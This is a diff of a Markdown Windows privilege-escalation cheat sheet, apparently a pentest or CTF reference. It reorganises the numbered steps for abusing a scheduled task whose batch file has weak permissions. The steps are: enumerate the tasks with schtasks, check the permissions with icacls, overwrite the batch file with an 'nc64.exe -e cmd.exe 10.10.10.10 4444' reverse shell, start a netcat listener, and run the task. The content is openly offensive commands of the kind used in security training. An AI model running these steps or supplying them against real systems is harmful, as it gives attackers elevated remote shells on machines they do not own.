@@ -128,6 +128,7 @@ Get-SmbServerConfiguration # Check the SMB version running on a Windows system (
 sc queryex type=service # List of all running services
 ----------------------------------------------------------------
 ✅ # Attacking services that have Weak executive permission 
+✅ # Insecure Permissions on Service Executable
 1️⃣ # Check the configuration details of a particular service example ( BINARY_PATH_NAME and SERVICE_START_NAME and .. )
 sc qc WindowsScheduler 
 2️⃣ # We check the executable file of this service has Weak permission or not
@@ -215,17 +216,18 @@ reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
 
 ## Scheduled Tasks ✅
 ```cmd
+1️⃣ # Check and find vuln task on target system
 schtasks # List recipe all scheduled tasks
 schtasks /query /fo LIST /v # list of all the scheduled tasks in the system, along with the full details of each task
 schtasks /query /tn vulntask /fo list /v  # Receive complete information about a particular task (eg Vulntask)
-----------------------------------------------------------------
-icacls c:\tasks\schtask.bat # check the file permissions in target system 
-----------------------------------------------------------------
-echo c:\tools\nc64.exe -e cmd.exe 10.10.10.10 4444 > C:\tasks\schtask.bat # Add a Reverse Shell in the executable file
-----------------------------------------------------------------
-nc -lvnp 4444 # Launch Lenner on the Hacker System
-----------------------------------------------------------------
-schtasks /run /tn vulntask # run 
+2️⃣ # check the file permissions in target system
+icacls c:\tasks\schtask.bat  
+3️⃣ # Add a Reverse Shell in the executable file
+echo c:\tools\nc64.exe -e cmd.exe 10.10.10.10 4444 > C:\tasks\schtask.bat  
+4️⃣ # Launch Lenner on the Hacker System
+nc -lvnp 4444 
+5️⃣ # run the vuln task
+schtasks /run /tn vulntask 
 ```
 ## AlwaysInstallElevated ✅
 
